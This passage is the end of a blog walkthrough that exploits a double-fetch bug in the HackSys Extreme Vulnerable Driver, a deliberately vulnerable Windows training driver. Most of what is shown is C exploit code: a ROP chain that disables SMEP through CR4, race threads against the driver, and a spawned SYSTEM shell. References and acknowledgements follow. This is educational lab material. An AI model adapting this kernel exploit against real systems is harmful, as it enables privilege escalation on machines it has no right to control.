<a id="__codelineno-35-227" name="__codelineno-35-227"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x169f37</span><span class="p">;</span><span class="w">       </span><span class="c1">// mov cr4, rcx ; ret </span>
<a id="__codelineno-35-228" name="__codelineno-35-228"></a>
<a id="__codelineno-35-229" name="__codelineno-35-229"></a><span class="w">    </span><span class="n">RtlFillMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">);</span><span class="w">        </span><span class="c1">// Fill buffer with junk till RIP</span>
<a id="__codelineno-35-230" name="__codelineno-35-230"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8</span><span class="p">);</span><span class="w">           </span><span class="c1">// mov rax, rcx ; ret</span>
<a id="__codelineno-35-231" name="__codelineno-35-231"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8</span><span class="p">);</span><span class="w">       </span><span class="c1">// pop rcx</span>
<a id="__codelineno-35-232" name="__codelineno-35-232"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8</span><span class="p">);</span><span class="w">      </span><span class="c1">// SMEP Disable Value</span>
<a id="__codelineno-35-233" name="__codelineno-35-233"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8</span><span class="p">);</span><span class="w">      </span><span class="c1">// Update CR4 </span>
<a id="__codelineno-35-234" name="__codelineno-35-234"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">[</span><span class="mi">2056</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ShellcodeAddress</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-235" name="__codelineno-35-235"></a>
<a id="__codelineno-35-236" name="__codelineno-35-236"></a>
<a id="__codelineno-35-237" name="__codelineno-35-237"></a><span class="w">    </span><span class="cm">/* Allocate IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-35-238" name="__codelineno-35-238"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">IO_THREAD_PARAM</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-35-239" name="__codelineno-35-239"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-240" name="__codelineno-35-240"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-241" name="__codelineno-35-241"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate memory for IO thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-242" name="__codelineno-35-242"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-243" name="__codelineno-35-243"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-244" name="__codelineno-35-244"></a>
<a id="__codelineno-35-245" name="__codelineno-35-245"></a><span class="w">    </span><span class="cm">/* Initialise IO_THREAD_PARAM struct members */</span><span class="w"></span>
<a id="__codelineno-35-246" name="__codelineno-35-246"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-247" name="__codelineno-35-247"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-248" name="__codelineno-35-248"></a>
<a id="__codelineno-35-249" name="__codelineno-35-249"></a><span class="w">    </span><span class="n">ExploitSuccess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-250" name="__codelineno-35-250"></a>
<a id="__codelineno-35-251" name="__codelineno-35-251"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-252" name="__codelineno-35-252"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-253" name="__codelineno-35-253"></a><span class="w">        </span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-254" name="__codelineno-35-254"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Opened thread for changing size %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-255" name="__codelineno-35-255"></a><span class="w">        </span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-256" name="__codelineno-35-256"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Set ChangeSizeThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span><span class="w"></span>
<a id="__codelineno-35-257" name="__codelineno-35-257"></a>
<a id="__codelineno-35-258" name="__codelineno-35-258"></a><span class="w">        </span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">,</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-259" name="__codelineno-35-259"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Opened thread for IOCTL Control %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-260" name="__codelineno-35-260"></a><span class="w">        </span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-261" name="__codelineno-35-261"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Set IoControlThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span><span class="w"></span>
<a id="__codelineno-35-262" name="__codelineno-35-262"></a>
<a id="__codelineno-35-263" name="__codelineno-35-263"></a><span class="w">        </span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-264" name="__codelineno-35-264"></a><span class="w">        </span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-265" name="__codelineno-35-265"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Set Affinity Mask for target threads!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-266" name="__codelineno-35-266"></a>
<a id="__codelineno-35-267" name="__codelineno-35-267"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-268" name="__codelineno-35-268"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-269" name="__codelineno-35-269"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-270" name="__codelineno-35-270"></a>
<a id="__codelineno-35-271" name="__codelineno-35-271"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-272" name="__codelineno-35-272"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WaitForMultipleObjects</span><span class="p">(</span><span class="n">NumProcessors</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeThreads</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="mi">120000</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-35-273" name="__codelineno-35-273"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-274" name="__codelineno-35-274"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-275" name="__codelineno-35-275"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-276" name="__codelineno-35-276"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-277" name="__codelineno-35-277"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-278" name="__codelineno-35-278"></a>
<a id="__codelineno-35-279" name="__codelineno-35-279"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-280" name="__codelineno-35-280"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">IoControlThreads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-35-281" name="__codelineno-35-281"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-282" name="__codelineno-35-282"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-283" name="__codelineno-35-283"></a>
<a id="__codelineno-35-284" name="__codelineno-35-284"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cmd.exe&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-285" name="__codelineno-35-285"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] 1337 System Shell Bozo&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-286" name="__codelineno-35-286"></a>
<a id="__codelineno-35-287" name="__codelineno-35-287"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-288" name="__codelineno-35-288"></a>
<a id="__codelineno-35-289" name="__codelineno-35-289"></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-35-290" name="__codelineno-35-290"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-291" name="__codelineno-35-291"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-292" name="__codelineno-35-292"></a>
<a id="__codelineno-35-293" name="__codelineno-35-293"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-294" name="__codelineno-35-294"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDriverHandle</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-35-295" name="__codelineno-35-295"></a>
<a id="__codelineno-35-296" name="__codelineno-35-296"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Running exploit function!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-297" name="__codelineno-35-297"></a>
<a id="__codelineno-35-298" name="__codelineno-35-298"></a><span class="w">    </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-299" name="__codelineno-35-299"></a>
<a id="__codelineno-35-300" name="__codelineno-35-300"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p><a class="md-button md-button--primary" href="https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/DoubleFetch.c">Exploit on <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span> </a></p>
<hr>

<h1 id="acknowledgements">Acknowledgements<a class="headerlink" href="#acknowledgements" title="Permanent link">&para;</a></h1>
<p>I would like to sincerely thank <a href="https://twitter.com/33y0re">Connor</a> for helping me and listening to my stupid ideas. I highly recommend you check out his <strong>much</strong> more technically complex <a href="https://connormcgarr.github.io/">blog</a>. Thanks Connor!</p>
<p>Thanks for reading! I am going to go and get my POC working on <abbr title="Redstone 1">RS1</abbr> now :p</p>
<hr>

<h1 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h1>
<ul>
<li>[1] - <a href="https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/">https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/</a></li>
<li>[2] - <a href="https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/">https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/</a></li>
<li>[3] - <a href="https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c">https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c</a></li>
<li>[4] - <a href="https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c">https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c</a></li>
<li>[5] - <a href="https://stackoverflow.com/questions/494163/what-is-pvoid-data-type">https://stackoverflow.com/questions/494163/what-is-pvoid-data-type</a></li>
<li>[6] - <a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf">https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf</a></li>
<li>[7] - <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber</a></li>
<li>[8] - <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority</a></li>
<li>[9] - <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask</a></li>
<li>[10] - <a href="https://stackoverflow.com/a/5919745">https://stackoverflow.com/a/5919745</a></li>
<li>[11] - <a href="https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/">https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/</a></li>
</ul>

  
  




  



                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
    
      
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
        <a href="../2022-05-14-HEVD3-StackOverflow/" class="md-footer__link md-footer__link--prev" aria-label="Previous: HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
            </div>
          </div>
        </a>
      
      
        
        <a href="../2022-06-11-HEVD3-MemoryDisclosure/" class="md-footer__link md-footer__link--next" aria-label="Next: HackSys Extreme Vulnerable Driver 3 - Memory Disclosure" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs Insiders
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://twitter.com/linxzsec" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://github.com/linxzsec" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://gitlab.com/linxzsec" target="_blank" rel="noopener" title="gitlab.com" class="md-social__link">
